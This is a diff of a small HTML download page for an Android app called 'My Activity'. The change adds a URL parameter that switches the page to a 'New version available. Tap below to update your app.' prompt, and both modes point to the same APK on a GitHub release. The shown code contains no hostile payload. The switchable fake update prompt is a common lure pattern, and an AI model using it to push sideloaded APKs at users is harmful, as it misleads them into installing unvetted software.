@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Download My Activity</title>
+  <title>MY ACTIVITY</title>
   <style>
     body{
       margin:0;
@@ -52,11 +52,25 @@
 <body>
   <div class="card">
     <h1>MY ACTIVITY</h1>
-    <p>Easy Report Saving System</p>
-    <button class="btn" onclick="downloadApp()">Download App</button>
+    <p id="pageText">Easy Report Saving System</p>
+    <button class="btn" id="actionBtn" onclick="downloadApp()">Download App</button>
   </div>
 
   <script>
+    const params = new URLSearchParams(window.location.search);
+    const isUpdateMode = params.get("mode") === "update";
+
+    const actionBtn = document.getElementById("actionBtn");
+    const pageText = document.getElementById("pageText");
+
+    if (isUpdateMode) {
+      actionBtn.textContent = "Update Now";
+      pageText.textContent = "New version available. Tap below to update your app.";
+    } else {
+      actionBtn.textContent = "Download App";
+      pageText.textContent = "Easy Report Saving System";
+    }
+
     function downloadApp(){
       window.location.href = "https://github.com/roz143757-web/My-Activity-/releases/download/v1.0/MyActivity-v1.apk";
     }
